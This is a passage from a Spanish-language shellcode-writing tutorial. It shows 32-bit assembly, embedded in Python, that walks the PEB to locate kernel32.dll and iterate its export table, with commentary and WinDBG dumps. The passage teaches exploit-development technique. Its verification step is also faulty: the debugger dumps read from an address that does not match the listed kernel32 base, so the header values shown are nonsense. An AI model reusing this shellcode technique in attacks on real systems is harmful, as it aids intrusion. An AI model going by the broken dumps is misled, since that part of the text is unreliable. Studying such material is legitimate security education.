</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-support z-type z-windows z-c">DWORD</span> Characteristics<span class="z-punctuation z-terminator z-c">;</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-support z-type z-windows z-c">DWORD</span> TimeDateStamp<span class="z-punctuation z-terminator z-c">;</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-support z-type z-windows z-c">WORD</span> MajorVersion<span class="z-punctuation z-terminator z-c">;</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-support z-type z-windows z-c">WORD</span> MinorVersion<span class="z-punctuation z-terminator z-c">;</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-support z-type z-windows z-c">DWORD</span> Name<span class="z-punctuation z-terminator z-c">;</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-support z-type z-windows z-c">DWORD</span> Base<span class="z-punctuation z-terminator z-c">;</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-support z-type z-windows z-c">DWORD</span> NumberOfFunctions<span class="z-punctuation z-terminator z-c">;</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-support z-type z-windows z-c">DWORD</span> NumberOfNames<span class="z-punctuation z-terminator z-c">;</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-support z-type z-windows z-c">DWORD</span> AddressOfFunctions<span class="z-punctuation z-terminator z-c">;</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-support z-type z-windows z-c">DWORD</span> AddressOfNames<span class="z-punctuation z-terminator z-c">;</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-support z-type z-windows z-c">DWORD</span> AddressOfNameOrdinals<span class="z-punctuation z-terminator z-c">;</span>
</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span>
</span></code></pre>
<p>Se debe tener en cuenta las matrices <code>AddressOfFunctions</code>, <code>AddressOfNames</code> y <code>AddressOfNameOrdinals.</code>, ya que son esenciales para la resolución de símbolos.</p>
<p>Comenzemos con <code>AddressOfNames</code>, cada nombre tendrá una entrada e índice único en el array.</p>
<p>Una vez que hemos encontrado el nombre del símbolo que buscamos en el índice i del array <code>AddressOfNames</code>, podemos usar el mismo índice i en el array <code>AddressOfNameOrdinals</code>.</p>
<p>La entrada del array <code>AddressOfNameOrdinals</code> en el índice i contendrá un valor que servirá como nuevo índice que usaremos en el array <code>AddressOfFunctions</code> . En este nuevo índice, encontraremos la dirección de memoria virtual relativa de la función.</p>
<p>Podemos convetir esta dirección en una Dirección de Memoria virtual (VMA) completamente funcional añadiéndole la dirección base de la DLL.</p>
<p>Para hacer este proceso, implementaremos una función hash de 4 bytes, que nos permitirá reutilizar las instrucciones de ensamblador para cualquier nombre de símbolo.</p>
<p>Una vez se resvuelva  el símbolo <code>LoadLibraryA</code> podremos cargar módulos arbitrarios sin necesidad de usar <code>GetProcAddress</code>.</p>
<p>La EDT, es la tabla principal que describe dónde están las otras tablas como la EAT.</p>
<h3 id="trabajando-con-la-matriz-de-nombres-de-exportacion">Trabajando con la matriz de nombres de exportación<a class="zola-anchor" href="#trabajando-con-la-matriz-de-nombres-de-exportacion" aria-label="Anchor link for: trabajando-con-la-matriz-de-nombres-de-exportacion" style="visibility: hidden;"></a>
</h3>
<p>Ahora que hemos cubierto la relación de las tres matrices en la tabla de directorios de exportacion (EDT) actualizemos nuestro script.</p>
<p>Para poder obtener la dirección de memoria virtual, nuestro shellcode suele añadir la dirección base de kernel32.dll al RVA, que recordemos que se almacena en EBX.</p>
<ul>
<li>RVA - Relative Virtual Address: Si <code>kernel32.dll</code> está cargado en <code>0x75000000</code> y una función tiene RVA <code>0x1234</code>, su VMA es <code>0x75001234</code>.</li>
<li>VMA - Virtual Memory Addres: Es la dirección real donde está el código o dato en memoria durante la ejecución.</li>
</ul>
<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">CODE</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-group z-python"><span class="z-punctuation z-section z-group z-begin z-python">(</span>
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">start:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">int3;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> breakpoint
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov ebp, esp;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> stack frame
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">sub esp, 0x200;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Se reserva 0x200 
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call find_kernel32;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">call find_function;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">    
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">   <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_kernel32:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">xor ecx, ecx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>          <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> null
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, fs:[ecx+30h];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> PEB       
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, [esi+0Ch];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> PEB -&gt; Ldr    
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, [esi+1Ch];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Ldr -&gt; InInitializationOrderModuleList
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">   <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">next_module:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov ebx, [esi+8h];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>     <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> base_name
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov edi, [esi+20h];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> module_name
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, [esi];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Siguiente (flink) 
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">cmp [edi+12*2], cx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> (unicode) module_name[12] == 0x00? 
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">jne next_module;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>       <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> No? -&gt; siguiente modulo  
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">ret;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_function:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">pushad;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                       <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Guardar todos los registros
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov eax, [ebx + 0x3c];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Offset a PE Header
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov edi, [ebx + eax + 0x78];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>  <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> RVA de Export Table
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">add edi, ebx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                 <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> VMA de Export Table
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov ecx, [edi + 0x18];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> NumberOfNames
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov eax, [edi + 0x20];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> RVA de AddressOfNames
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">add eax, ebx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                 <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> VMA de AddressOfNames
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov [ebp - 4], eax;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>           <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Guardar AddressOfNames
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_function_loop:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">jecxz find_function_finished;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Si ECX == 0, salir
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">dec ecx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Contador
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov eax, [ebp - 4];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>           <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> AddressOfNames VMA
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">mov esi, [eax + ecx * 4];<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>     <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Obtener RVA del nombre del símbolo
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">add esi, ebx;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                 <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Convertir a VMA
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">    <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">find_function_finished:<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
</span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">popad;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                      <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Restaurar registros
</span></span></span><span class="z-source z-python"><span class="z-meta z-group z-python">      <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">ret;<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>                        
</span></span></code></pre>
<p>Se ha modificado el espacio reservado en la pila para evitar una sobrecarga y las instrucciones necesaria para buscar <code>kernel32.dll</code>, se han encapsulado en la función <code>find_kernel32</code>.</p>
<p>Se han implementado 3 funciones adicionales, una vez que se ha encontrado la dirección base de <strong>Kernel32</strong>, se ejecutará la función <code>find_function</code>, que primero guarda todos los registros en la pila mediante <code>pushad</code>. Esto nos pertmitirá restaurarlos correctamente más adelante.</p>
<p>El siguiente paso es almacenar el valor apuntado por ebx que contiene la dirección de kernel32 en el desplazamiento <code>0x3C</code> en EAX.Se usa este desplazamiento porque es el que hay desde el incio de un PE hasta el Encabezado PE. (<code>e_lfanew</code>).</p>
<p>La siguiente instrucción <code>mov edi, [ebx + eax + 0x78]</code>, utiliza el valor previamente guardado en EAX (el offset que va a PE header), lo añade a la dirección base de kernel32 almacenada en EBX con un desplazamiento estático de <code>0x78</code> y almacena el valor desreferenciado en EDI, se usa el desplazamiento de <code>0x78</code>, porque es donde se encuentra el RVA de la tabla de directorios de exportación.</p>
<p>Esta dirección se convierte en VMA añadiéndola a la dirección base de <code>kernel32.dll</code> mediante una instrucción de asm <code>add</code>:</p>
<pre class="z-code"><code><span class="z-text z-plain">    &quot;find_function:&quot;
</span><span class="z-text z-plain">      &quot;pushad;&quot;                       # Guardar todos los registros
</span><span class="z-text z-plain">      &quot;mov eax, [ebx + 0x3c];&quot;        # Offset a PE Header
</span><span class="z-text z-plain">      &quot;mov edi, [ebx + eax + 0x78];&quot;  # RVA de Export Table
</span><span class="z-text z-plain">      &quot;add edi, ebx;&quot;                 # VMA de Export Table
</span></code></pre>
<p>Ahora EDI, contiene la dirección de memoria virtual de nuestra tabla de directorio de exportación, continuemos con las siguientes instrucciones.</p>
<pre class="z-code"><code><span class="z-text z-plain">      &quot;mov ecx, [edi + 0x18];&quot;        # NumberOfNames
</span><span class="z-text z-plain">      &quot;mov eax, [edi + 0x20];&quot;        # RVA de AddressOfNames
</span><span class="z-text z-plain">      &quot;add eax, ebx;&quot;                 # VMA de AddressOfNames
</span><span class="z-text z-plain">      &quot;mov [ebp - 4], eax;&quot;           # Guardar AddressOfNames
</span></code></pre>
<p>Esto nos permite usar el valor ahora almacenado en ECX (NumberOfNames) como un contador para analizar AddressOfNames.</p>
<p>Continuamos con las siguientes instrucciones, trasladamos el valor de EDI y el desplazamiento <code>0x20</code>, que corresponde al campo <strong>AddresOfNames</strong> a EAX. Dado que se trata de una RVA le añadimos la dirección de kernel32 (EBX) para obtener la dirección VMA de AddresOfNames, la última instrucción almacena la drección de <strong>AddresOfNames</strong> en un desplazamiento arbitrario respecto a EBP. Actualmente EBP, contiene el puntero de la pila <code>mov ebp, esp</code> que se hizo al inicio del shellcode.</p>
<p>Una vez explicada la función <code>find_function</code>, seguimos con la función <code>find_function_loop</code> que comienza con un salto condicional basado en el valor de ECX, que contiene el número de símbolos exportados, si es nulo saldrá del bucle.</p>
<pre class="z-code"><code><span class="z-text z-plain">    &quot;find_function_loop:&quot;
</span><span class="z-text z-plain">      &quot;jecxz find_function_finished;&quot; # Si ECX == 0, salir
</span><span class="z-text z-plain">      &quot;dec ecx;&quot;                      # Contador
</span><span class="z-text z-plain">      &quot;mov eax, [ebp - 4];&quot;           # AddressOfNames VMA
</span><span class="z-text z-plain">      &quot;mov esi, [eax + ecx * 4];&quot;     # Obtener RVA del nombre del símbolo
</span><span class="z-text z-plain">      &quot;add esi, ebx;&quot;                 # Convertir a VMA
</span></code></pre>
<p>Si el registro ECX no es nulo, decrementaremos nuestro contador <code>dec ecx</code>, y cargaremos la dirección guardada anteriormente en <code>ebp -4</code> o AddressOfNames.</p>
<p>Podemos usar el contador ECX como índice del array AddresOfNames y multiplicarlo por 4 <code>mov esi, [eax + ecx * 4]</code> ya que cada entrada del array es un DWORD. A continuación, guardamos la RVA del nombre del símbolo en ESI, y para convertir a VMA, sumamos EBX (kernel32) a ESI.</p>
<p>La función <code>find_function_finished</code>, restarura todos los registros y recupera el flujo.</p>
<p>Pasamos de nuevo a WinDBG, intentaremos recopilar manualmente la RVA de la tabla de directorios de exportación para verificar que nuestro shellcode funcione correctamente, Podemos comenzar reuniendo el desplazamiento hasta el inicio del encabezado PE desde el comienzo del módulo <code>kernel32.dll</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; lm m kernel32
</span><span class="z-text z-plain">Browse full module list
</span><span class="z-text z-plain">start    end        module name
</span><span class="z-text z-plain">76c00000 76c9d000   KERNEL32   (pdb symbols)          C:\ProgramData\Dbg\sym\kernel32.pdb\2036C2DF985F0B2A0EAED37F2E897EC41\kernel32.pdb
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">0:004&gt; dt ntdll!_IMAGE_DOS_HEADER 76c00000
</span><span class="z-text z-plain">   +0x000 e_magic          : 0x5a4d
</span><span class="z-text z-plain">   +0x002 e_cblp           : 0x90
</span><span class="z-text z-plain">   +0x004 e_cp             : 3
</span><span class="z-text z-plain">   +0x006 e_crlc           : 0
</span><span class="z-text z-plain">   +0x008 e_cparhdr        : 4
</span><span class="z-text z-plain">   +0x00a e_minalloc       : 0
</span><span class="z-text z-plain">   +0x00c e_maxalloc       : 0xffff
</span><span class="z-text z-plain">   +0x00e e_ss             : 0
</span><span class="z-text z-plain">   +0x010 e_sp             : 0xb8
</span><span class="z-text z-plain">   +0x012 e_csum           : 0
</span><span class="z-text z-plain">   +0x014 e_ip             : 0
</span><span class="z-text z-plain">   +0x016 e_cs             : 0
</span><span class="z-text z-plain">   +0x018 e_lfarlc         : 0x40
</span><span class="z-text z-plain">   +0x01a e_ovno           : 0
</span><span class="z-text z-plain">   +0x01c e_res            : [4] 0
</span><span class="z-text z-plain">   +0x024 e_oemid          : 0
</span><span class="z-text z-plain">   +0x026 e_oeminfo        : 0
</span><span class="z-text z-plain">   +0x028 e_res2           : [10] 0
</span><span class="z-text z-plain">   +0x03c e_lfanew         : 0n232
</span></code></pre>
<p>Según el snippet de código anterior, el encabezado PE se encuentra en el desplazamiento <code>0xE8</code> (232 = 000000e8).</p>
<p>Revisando la estructura <code>IMAGE_NT_HEADERS</code>, observamos que <code>IMAGE_OPTIONAL_HEADER</code> tiene un desplazamiento de <code>0x018</code>.</p>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; dt ntdll!_IMAGE_NT_HEADERS 0x76c20000 + 0E8
</span><span class="z-text z-plain">   +0x000 Signature        : 0x85f88b76
</span><span class="z-text z-plain">   +0x004 FileHeader       : _IMAGE_FILE_HEADER
</span><span class="z-text z-plain">   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">0:004&gt; dt ntdll!_IMAGE_OPTIONAL_HEADER 0x76c20000 + 0E8 + 0x18
</span><span class="z-text z-plain">   +0x000 Magic            : 0xc8fe
</span><span class="z-text z-plain">   +0x002 MajorLinkerVersion : 0xf &#39;&#39;
</span><span class="z-text z-plain">   +0x003 MinorLinkerVersion : 0xb6 &#39;&#39;
</span><span class="z-text z-plain">   +0x004 SizeOfCode       : 0x36ff50c0
</span><span class="z-text z-plain">   +0x008 SizeOfInitializedData : 0xc0ec15ff
</span><span class="z-text z-plain">   +0x00c SizeOfUninitializedData : 0x388176c8
</span><span class="z-text z-plain">   +0x010 AddressOfEntryPoint : 0x1000
</span><span class="z-text z-plain">   +0x014 BaseOfCode       : 0x5d392977
</span><span class="z-text z-plain">   +0x018 BaseOfData       : 0x99850fac
</span><span class="z-text z-plain">   +0x01c ImageBase        : 0x850001ae
</span><span class="z-text z-plain">   +0x020 SectionAlignment : 0x8d0b74f6
</span><span class="z-text z-plain">   +0x024 FileAlignment    : 0xf03bb045
</span><span class="z-text z-plain">   +0x028 MajorOperatingSystemVersion : 0x850f
</span><span class="z-text z-plain">   +0x02a MinorOperatingSystemVersion : 0xae98
</span><span class="z-text z-plain">   +0x02c MajorImageVersion : 1
</span><span class="z-text z-plain">   +0x02e MinorImageVersion : 0x4d8b
</span><span class="z-text z-plain">   +0x030 MajorSubsystemVersion : 0x8bfc
</span><span class="z-text z-plain">   +0x032 MinorSubsystemVersion : 0x5fc7
</span><span class="z-text z-plain">   +0x034 Win32VersionValue : 0x5bcd335e
</span><span class="z-text z-plain">   +0x038 SizeOfImage      : 0xc8fce8
</span><span class="z-text z-plain">   +0x03c SizeOfHeaders    : 0x8bc3c900
</span><span class="z-text z-plain">   +0x040 CheckSum         : 0xc6a445
</span><span class="z-text z-plain">   +0x044 Subsystem        : 0xeb01
</span><span class="z-text z-plain">   +0x046 DllCharacteristics : 0xcccf
</span><span class="z-text z-plain">   +0x048 SizeOfStackReserve : 0xcccccccc
</span><span class="z-text z-plain">   +0x04c SizeOfStackCommit : 0xcccccccc
</span><span class="z-text z-plain">   +0x050 SizeOfHeapReserve : 0xa8780d8b
</span><span class="z-text z-plain">   +0x054 SizeOfHeapCommit : 0xc03376c8
</span><span class="z-text z-plain">   +0x058 LoaderFlags      : 0x80c8138
</span><span class="z-text z-plain">   +0x05c NumberOfRvaAndSizes : 0x950f0000
</span><span class="z-text z-plain">   +0x060 DataDirectory    : [16] _IMAGE_DATA_DIRECTORY
</span></code></pre>
